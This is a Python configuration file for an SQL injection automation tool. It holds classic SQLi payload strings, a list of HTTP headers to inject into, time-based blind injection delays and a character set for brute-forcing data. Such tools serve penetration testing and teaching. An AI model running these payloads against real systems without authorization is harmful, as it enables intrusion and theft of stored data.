"""
config.py - Central configuration for the SQLi Automation Tool

What's going on:
    This file stores all default settings in one place.
    It makes the tool easy to customize without digging through code.
"""


class Config:
    """Global configuration settings."""

    # Default timeout for HTTP requests (seconds)
    REQUEST_TIMEOUT = 10

    # Number of times to repeat a request for averaging response size
    BASELINE_SAMPLES = 3

    # If response size differs by more than this percentage, flag it
    SIZE_DEVIATION_THRESHOLD = 0.10  # 10%

    # Default payloads for basic SQLi testing
    BASIC_PAYLOADS = [
        "' OR 1=1--",
        "' OR '1'='1'--",
        "' OR 1=1#",
        "\" OR 1=1--",
        "' OR ''='",
        "admin' --",
        "1' OR '1'='1",
    ]

    # User-Agent to use for "normal" baseline requests
    DEFAULT_USER_AGENT = (
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    )

    # Headers to test injection into
    INJECTABLE_HEADERS = [
        "User-Agent",
        "Referer",
        "X-Forwarded-For",
        "Accept-Language",
    ]

    # Time-based blind defaults
    DEFAULT_SLEEP_TIME = 5  # seconds for pg_sleep / WAITFOR DELAY
    BASELINE_PING_SAMPLES = 5  # how many pings to average

    # Characters to brute-force in blind SQLi
    CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-@.!#$%"